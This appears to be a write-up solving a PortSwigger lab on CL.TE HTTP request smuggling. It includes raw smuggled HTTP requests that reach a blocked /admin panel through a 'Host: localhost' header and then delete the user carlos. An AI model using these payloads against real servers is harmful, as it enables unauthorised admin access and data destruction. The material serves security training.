# [Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te)

## Lab

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at `/admin`, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user `carlos`.

## Detect CL.TE

- burpsuite active scan: detected http request smuggling after 5 minutes
- burpsuite `HTTP request smuggler` extension: detected CL.TE
- smuggler.py: `[tabprefix1]   : Potential CLTE Issue Found`

## Analysis

"Path /admin is blocked" by frontend:

  ```http
  GET /admin HTTP/1.1

  HTTP/1.1 403 Forbidden

  "Path /admin is blocked"
  ```

try to smuggling:

- 1:

  ```http
  POST / HTTP/1.1^M$
  Host: 0ac900280337e237c0ff3baf008d00d4.web-security-academy.net^M$
  Content-Type: application/x-www-form-urlencoded^M$
  Content-Length: 30^M$
  tRANSFER-ENCODING: chunked^M$
  ^M$
  0^M$
  ^M$
  GET /admin HTTP/1.1^M$
  foo: 
  ```

- 2:

  ```http
  GET / HTTP/1.1

  HTTP/1.1 401 Unauthorized

  Admin interface only available to local users
  ```

## Solutions

bypass the `only available to local users` by the `Host: localhost` header.

smuggling:

- access `/admin` endpoint:

  ```http
  POST / HTTP/1.1^M$
  Host: 0ac900280337e237c0ff3baf008d00d4.web-security-academy.net^M$
  Content-Type: application/x-www-form-urlencoded^M$
  Content-Length: 68^M$
  tRANSFER-ENCODING: chunked^M$
  ^M$
  0^M$
  ^M$
  GET /admin HTTP/1.1^M$
  Host: localhost^M$
  Content-Length: 100^M$
  ^M$
  x=
  ```

  - the `Content-Length: 100` used to make the second request's headers append to the smuggled request body

  ```http
  GET / HTTP/1.1^M$
  Host: 0ac900280337e237c0ff3baf008d00d4.web-security-academy.net^M$
  Cookie: session=sNE9kWEDCJZXWYrgcKSERUthL6KDPx7I^M$
  ^M$

  HTTP/1.1 200 OK

  <a href="/admin/delete?username=carlos">Delete</a>
  ```

- delete carlos account:

  ```http
  POST / HTTP/1.1^M$
  Host: 0ac900280337e237c0ff3baf008d00d4.web-security-academy.net^M$
  Content-Type: application/x-www-form-urlencoded^M$
  Content-Length: 91^M$
  tRANSFER-ENCODING: chunked^M$
  ^M$
  0^M$
  ^M$
  GET /admin/delete?username=carlos HTTP/1.1^M$
  Host: localhost^M$
  Content-Length: 100^M$
  ^M$
  x=
  ```

  ```http
  GET / HTTP/1.1^M$
  Host: 0ac900280337e237c0ff3baf008d00d4.web-security-academy.net^M$
  Cookie: session=sNE9kWEDCJZXWYrgcKSERUthL6KDPx7I^M$
  ^M$

  HTTP/1.1 200 OK

  <a href="/admin/delete?username=carlos">Delete</a>
  ```
